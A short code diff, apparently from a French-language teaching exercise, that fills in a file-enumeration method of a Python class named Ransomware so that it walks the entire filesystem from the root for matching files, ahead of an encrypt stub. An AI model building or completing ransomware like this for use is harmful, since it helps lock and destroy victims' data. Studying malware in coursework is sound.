@@ -36,7 +36,12 @@ class Ransomware:
 
     def get_files(self, filter:str)->list:
         # return all files matching the filter
-        raise NotImplemented()
+
+        #Path('/') pour partir de la racine du système
+        #rglob renvoie l'addresse absolue ici car on par de la racie système
+        files_list=Path('/').rglob(filter)
+
+        return files_list
 
     def encrypt(self):
         # main function for encrypting (see PDF)
